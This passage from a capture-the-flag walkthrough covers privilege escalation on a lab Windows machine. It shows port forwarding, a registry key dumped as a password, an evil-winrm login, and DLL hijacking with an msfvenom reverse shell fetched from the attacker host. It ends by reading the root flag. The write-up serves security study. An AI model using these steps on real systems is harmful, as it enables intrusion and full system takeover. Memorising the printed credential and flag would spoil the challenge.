    tcp    0.0.0.0:49665       0.0.0.0:*           LISTEN       0     0      532/wininit.exe
    tcp    0.0.0.0:49666       0.0.0.0:*           LISTEN       0     0      968/svchost.exe
    tcp    0.0.0.0:49667       0.0.0.0:*           LISTEN       0     0      1328/svchost.exe
    tcp    0.0.0.0:49668       0.0.0.0:*           LISTEN       0     0      676/services.exe
    tcp    10.10.11.238:80     10.10.14.110:33870  ESTABLISHED  0     0      4/System
    tcp    10.10.11.238:80     10.10.14.110:33964  ESTABLISHED  0     0      4/System
    tcp    10.10.11.238:80     10.10.14.110:35156  ESTABLISHED  0     0      4/System
    tcp    10.10.11.238:80     10.10.14.110:35226  ESTABLISHED  0     0      4/System
    tcp    10.10.11.238:80     10.10.14.110:45318  ESTABLISHED  0     0      4/System
    tcp    10.10.11.238:80     10.10.14.110:45388  ESTABLISHED  0     0      4/System
    tcp    10.10.11.238:80     10.10.14.110:53014  ESTABLISHED  0     0      4/System
    tcp    10.10.11.238:80     10.10.14.110:53054  ESTABLISHED  0     0      4/System
    tcp    10.10.11.238:80     10.10.14.110:53066  ESTABLISHED  0     0      4/System
    tcp    10.10.11.238:80     10.10.14.110:53074  ESTABLISHED  0     0      4/System
    tcp    10.10.11.238:139    0.0.0.0:*           LISTEN       0     0      4/System
    tcp    10.10.11.238:443    10.10.14.92:54216   ESTABLISHED  0     0      4/System
    tcp    10.10.11.238:443    10.10.14.104:60140  ESTABLISHED  0     0      4/System
    tcp    10.10.11.238:443    10.10.14.110:55056  ESTABLISHED  0     0      4/System
    tcp    10.10.11.238:443    10.10.14.110:55112  ESTABLISHED  0     0      4/System
    tcp    10.10.11.238:443    10.10.14.110:55146  ESTABLISHED  0     0      4/System
    tcp    10.10.11.238:443    10.10.14.110:55152  ESTABLISHED  0     0      4/System
    tcp    10.10.11.238:443    10.10.14.110:55208  ESTABLISHED  0     0      4/System
    tcp    10.10.11.238:443    10.10.14.110:55222  ESTABLISHED  0     0      4/System
    tcp    10.10.11.238:443    10.10.14.110:55242  ESTABLISHED  0     0      4/System
    tcp    10.10.11.238:443    10.10.14.110:57626  ESTABLISHED  0     0      4/System
    tcp    10.10.11.238:443    10.10.14.110:57644  ESTABLISHED  0     0      4/System
    tcp    10.10.11.238:443    10.10.14.110:57680  ESTABLISHED  0     0      4/System
    tcp    10.10.11.238:64018  10.10.14.91:4433    ESTABLISHED  0     0      6116/w3wp.exe
    tcp    10.10.11.238:64023  10.10.16.48:4444    ESTABLISHED  0     0      6116/w3wp.exe
    tcp    10.10.11.238:64024  10.10.16.48:4433    ESTABLISHED  0     0      5192/powershell.exe
    tcp    10.10.11.238:64035  10.10.14.124:9001   ESTABLISHED  0     0      6116/w3wp.exe
    tcp    127.0.0.1:100       127.0.0.1:64036     ESTABLISHED  0     0      5812/ReportManagement.exe
    tcp    127.0.0.1:64036     127.0.0.1:100       ESTABLISHED  0     0      5192/powershell.exe
    tcp6   :::80               :::*                LISTEN       0     0      4/System
    tcp6   :::135              :::*                LISTEN       0     0      920/svchost.exe
    tcp6   :::443              :::*                LISTEN       0     0      4/System
    tcp6   :::445              :::*                LISTEN       0     0      4/System
    tcp6   :::5985             :::*                LISTEN       0     0      4/System
    tcp6   :::8080             :::*                LISTEN       0     0      4/System
    tcp6   :::47001            :::*                LISTEN       0     0      4/System
    tcp6   :::49664            :::*                LISTEN       0     0      684/lsass.exe
    tcp6   :::49665            :::*                LISTEN       0     0      532/wininit.exe
    tcp6   :::49666            :::*                LISTEN       0     0      968/svchost.exe
    tcp6   :::49667            :::*                LISTEN       0     0      1328/svchost.exe
    tcp6   :::49668            :::*                LISTEN       0     0      676/services.exe
    udp    0.0.0.0:123         0.0.0.0:*                        0     0      4680/svchost.exe
    udp    0.0.0.0:5050        0.0.0.0:*                        0     0      2928/svchost.exe
    udp    0.0.0.0:5353        0.0.0.0:*                        0     0      1796/svchost.exe
    udp    0.0.0.0:5355        0.0.0.0:*                        0     0      1796/svchost.exe
    udp    10.10.11.238:137    0.0.0.0:*                        0     0      4/System
    udp    10.10.11.238:138    0.0.0.0:*                        0     0      4/System
    udp    10.10.11.238:1900   0.0.0.0:*                        0     0      3412/svchost.exe
    udp    10.10.11.238:65448  0.0.0.0:*                        0     0      3412/svchost.exe
    udp    127.0.0.1:1900      0.0.0.0:*                        0     0      3412/svchost.exe
    udp    127.0.0.1:58292     0.0.0.0:*                        0     0      2864/svchost.exe
    udp    127.0.0.1:65449     0.0.0.0:*                        0     0      3412/svchost.exe
    udp6   :::123              :::*                             0     0      4680/svchost.exe
    udp6   ::1:1900            :::*                             0     0      3412/svchost.exe
    udp6   ::1:65447           :::*                             0     0      3412/svchost.exe

(Meterpreter 2)(c:\windows\system32\inetsrv) > portfwd add -l 10100 -p 100 -r 127.0.0.1
[*] Forward TCP relay created: (local) :10100 -> (remote) 127.0.0.1:100
```

Connect using netcat to this port and see what functionality is available.

```bash
$ nc 127.0.0.1 10100
Reports Management administrative console. Type "help" to view available commands.
$ help
Available Commands:
backup: Perform a backup operation.
validate: Validates if any report has been altered since the last backup.
recover <filename>: Restores a specified file from the backup to the Reports folder.
upload <external source>: Uploads the reports to the specified external source.
```

Using ```dnspy``` reverse the binary DotNet file ```C:\inetpub\ExaminationPanel\ExaminationPanel\bin\ExaminationManagement.dll``` and find the path in the registry where the encryption key is located, then pull it out.

```bash
(Meterpreter 2)(c:\windows\system32\inetsrv) > reg queryval -k HKLM\\Software\\MedDigi -v EncKey
Key: HKLM\Software\MedDigi
Name: EncKey
Type: REG_SZ
Data: 1g0tTh3R3m3dy!!
```

Now using ```evil-winrm``` to connect to the machine as ```devdoc```:

```bash
$ gem install evil-winrm

$ evil-winrm  -i 10.10.11.238 -u devdoc -p '1g0tTh3R3m3dy!!'
Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\devdoc\Documents> whoami
appsanity\devdoc
```

Find the directory ```C:\Program Files\ReportManagement``` and in it the binary file ```ReportManagement.exe```. By reversing this binary, we realize that it loads ```C:\Program Files\ReportManagement\Libraries\externalupload.dll``` as a dynamic library.

Let's check our permissions on this file.

```bash
*Evil-WinRM* PSC:\Users\devdoc\Documents> cd "C:\Program Files\ReportManagement\Libraries"

*Evil-WinRM* PS C:\Program Files\ReportManagement\Libraries> icacls externalupload.dll
externalupload.dll APPSANITY\devdoc:(I)(RX,W)
                   APPSANITY\devdoc:(I)(F)
                   NT AUTHORITY\SYSTEM:(I)(F)
                   BUILTIN\Administrators:(I)(F)
                   BUILTIN\Users:(I)(R)
                   APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                   APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

We can overwrite this file as devdoc.

Let's generate a reverse shell for meterpreter:

```bash
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.48 LPORT=4445 -f dll -o externalupload.dll
$ python3 -m http.server 8081
```

Rename the old externalupload.dll and upload our own instead.

```bash
*Evil-WinRM* PS C:\Program Files\ReportManagement\Libraries> mv externalupload.dll externalupload.dll.old
*Evil-WinRM* PS C:\Program Files\ReportManagement\Libraries> Invoke-WebRequest -Uri  http://10.10.16.48:8081/externalupload.dll -UseBasicParsing -OutFile "externalupload.dll"
```

Start reverse_tcp the connection:

```bash
$ msfconsole -q
[msf](Jobs:0 Agents:0) >> use windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) payload(windows/x64/meterpreter/reverse_tcp) >> options

Module options (payload/windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) payload(windows/x64/meterpreter/reverse_tcp) >> set LHOST 10.10.16.48
LHOST => 10.10.16.48
[msf](Jobs:0 Agents:0) payload(windows/x64/meterpreter/reverse_tcp) >> set LPORT 4445
LPORT => 4445
[msf](Jobs:0 Agents:0) payload(windows/x64/meterpreter/reverse_tcp) >> exploit
[*] Payload Handler Started as Job 0

[*] Started reverse TCP handler on 10.10.16.48:4445
```

Let's start connection waiting in meterpreter, after which we will connect again with netcat to the service with ```RemoteManagement.exe``` and write into it ```upload pwn```:

```bash
$ nc 127.0.0.1 10100
Reports Management administrative console. Type "help" to view available commands.
$ upload pwn
Attempting to upload to external source.
```

Catch the connection:

```bash
[msf](Jobs:1 Agents:0) payload(windows/x64/meterpreter/reverse_tcp) >> [*] Sending stage (200774 bytes) to 10.10.11.238
[*] Meterpreter session 1 opened (10.10.16.48:4445 -> 10.10.11.238:50326) at 2023-10-30 17:54:58 +0200

[msf](Jobs:1 Agents:1) payload(windows/x64/meterpreter/reverse_tcp) >> sessions -l

Active sessions
===============

  Id  Name  Type                     Information                          Connection
  --  ----  ----                     -----------                          ----------
  1         meterpreter x64/windows  APPSANITY\Administrator @ APPSANITY  10.10.16.48:4445 -> 10.10.11.238:50326 (10.10.11.238)

[msf](Jobs:1 Agents:1) payload(windows/x64/meterpreter/reverse_tcp) >> sessions 1
[*] Starting interaction with 1...

(Meterpreter 1)(C:\Program Files\ReportManagement) > shell
Process 2012 created.
Channel 1 created.
Microsoft Windows [Version 10.0.19045.3570]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files\ReportManagement>whoami
whoami
appsanity\administrator
```

## Administrator flag

```bash
C:\Program Files\ReportManagement>cd C:\Users\Administrator\Desktop
cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is F854-971D

 Directory of C:\Users\Administrator\Desktop

10/23/2023  02:37 PM    <DIR>          .
10/23/2023  02:37 PM    <DIR>          ..
10/30/2023  08:14 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   3,902,246,912 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
c90142a748ea58e5fba49f97a45a7899
```